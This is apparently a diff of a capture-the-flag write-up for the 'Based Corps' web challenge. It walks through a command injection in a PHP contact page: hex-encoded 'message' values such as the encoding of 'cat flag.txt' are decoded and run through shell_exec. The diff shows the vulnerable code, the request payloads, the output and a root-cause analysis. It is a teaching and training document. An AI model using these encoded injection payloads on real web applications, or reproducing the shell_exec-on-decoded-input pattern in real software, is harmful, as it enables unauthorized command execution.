@@ -1,3 +1,4 @@
+
 # Based Corps — Web Challenge Writeup (325 pts)
 
 **Challenge name:** Based Corps  
@@ -7,93 +8,121 @@
 
 ---
 
-## Overview
+## Challenge Overview
 
-This challenge is a **command injection** vulnerability, but with a twist:  
-the application **only executes commands if they are hex-encoded**.
+![Challenge banner](BasedCorps_chall.png)
 
-At first glance, inputs look safely displayed and filtered, but by understanding
-how the backend decodes hexadecimal input, we can bypass the restrictions and
-execute system commands.
+This challenge demonstrates a **command injection vulnerability** hidden behind
+what looks like safe input handling.  
+The twist: **commands are only executed if they are hex-encoded**.
+
+By understanding how the backend decodes hexadecimal input, we can bypass the
+filters and execute system commands.
 
 ---
 
-## Application Analysis
+## Application Recon
 
-The interesting endpoint is the **Contact** page:
+### Home Page
 
-```
-/contact.php
-```
+![Home page](home_corps.png)
 
-User input is passed via the `message` GET parameter.
+The website looks like a normal corporate portal with several pages:
+- Home
+- Projects
+- Documents
+- About
+- **Contact** (interesting one 👀)
 
-Key observations from the source code:
+---
 
-- If `message` contains **only hexadecimal characters**, it is:
-  1. Decoded using `hex2bin`
-  2. Treated as a command
-- Only two commands are allowed:
-  - `ls`
-  - `cat <file>`
-- Any non-hex input is safely displayed and **not executed**
+## Vulnerable Endpoint — Contact Page
 
-Relevant logic (simplified):
+![Contact page](contact_page.png)
+
+User-controlled input is sent via the **`message` GET parameter**.
+
+Trying normal input:
+
+![Normal input](hi.png)
+
+The input is simply reflected back — no execution.
+
+At first glance, this might look like XSS or SSTI, but neither works here.
+
+---
+
+## Source Code Analysis
+
+Relevant backend logic from `contact.php`:
 
 ```php
-if (preg_match('/^[0-9a-fA-F]+$/', $message)) {
-    $decoded = hex2bin($message);
-    shell_exec($decoded);
+if (preg_match('/\A[0-9a-fA-F]{2,1024}\z/', $trimmed)) {
+    $decoded = hex2bin($trimmed);
+    if ($decoded !== false) {
+        shell_exec($decoded);
+    }
 }
 ```
 
+### Key Observations
+
+- Only **hexadecimal input** is decoded
+- Decoded input is passed directly to `shell_exec`
+- Plain text is treated as harmless user content
+
 This means:
+
 > **Hex = execution**  
-> **Plain text = harmless output**
+> **Plain text = safe display**
 
 ---
 
-## Step 1 — Confirm Normal Input Is Safe
+## Step 1 — Failed Direct Command Injection
 
-Trying a simple payload:
+Trying to inject directly:
 
 ```
 message=ls
 ```
 
-Result:
-- Input is echoed back
-- No command execution
+![Direct ls attempt](ls_command.png)
 
-So direct command injection **does not work**.
+❌ No execution — input is treated as normal text.
 
 ---
 
-## Step 2 — Encode Commands in Hexadecimal
+## Step 2 — Hex-Encode the Command
 
-Since the challenge hint mentions *hexadecimal*, we try encoding commands.
+The challenge hint explicitly mentions **hexadecimal**.
+
+Using CyberChef:
 
 ### Encode `ls`
 
-Using CyberChef or any hex encoder:
+![CyberChef ls](ls_cyberchef.png)
+
+Result:
 
 ```
-ls  →  6c73
+ls → 6c73
 ```
 
-Request:
+Submit:
 
 ```
 /contact.php?message=6c73
 ```
 
-✅ **Success!**
+![Hex ls result](ls_encoded_result.png)
 
-The server executes `ls` and returns a directory listing:
+✅ **Command executed successfully**
+
+Directory listing reveals:
 
 ```
 about.php
-assets
+assets/
 contact.php
 documents.php
 flag.txt
@@ -101,22 +130,20 @@ index.php
 ...
 ```
 
-We clearly see **flag.txt**.
+We spot **flag.txt** 🎯
 
 ---
 
 ## Step 3 — Read the Flag
 
-Now encode:
+### Encode `cat flag.txt`
+
+![CyberChef cat flag](cat_flag_cyberchef.png)
+
+Hex output:
 
 ```
-cat flag.txt
-```
-
-Hex encoding:
-
-```
-cat flag.txt → 63617420666c61672e747874
+63617420666c61672e747874
 ```
 
 Request:
@@ -125,7 +152,7 @@ Request:
 /contact.php?message=63617420666c61672e747874
 ```
 
-✅ **Command executed successfully**
+![Final flag](final_flag_cat.png)
 
 ---
 
@@ -137,25 +164,26 @@ SecurinetsISTIC{c0mm4nd_inj3ct10n_fr_t00_risky}
 
 ---
 
-## Root Cause
+## Root Cause Analysis
 
-The vulnerability exists because:
+This vulnerability exists because:
 
-- Hex input is **trusted more than plain text**
-- `hex2bin()` converts user input into executable commands
-- Filtering is applied *before* decoding, not after
+- Input validation is done **before decoding**
+- Encoded data is incorrectly trusted
+- `shell_exec()` is used on decoded user input
 
-This is a classic example of:
-> **Security checks on encoded input instead of decoded data**
+This is a classic case of:
+
+> ❌ **Filtering encoded input instead of decoded data**
 
 ---
 
-## Key Takeaways
+## Security Takeaways
 
+- Encoding is **not sanitization**
 - Always validate **after decoding**
-- Encoding ≠ sanitization
-- Command allowlists are dangerous if user-controlled
-- Never pass decoded user input directly to `shell_exec`
+- Never pass user-controlled data to `shell_exec`
+- Allowlists can still be dangerous if misused
 
 ---
 
@@ -168,4 +196,4 @@ This is a classic example of:
 
 ---
 
-Happy hacking 🚀
+Happy hacking 🚀  
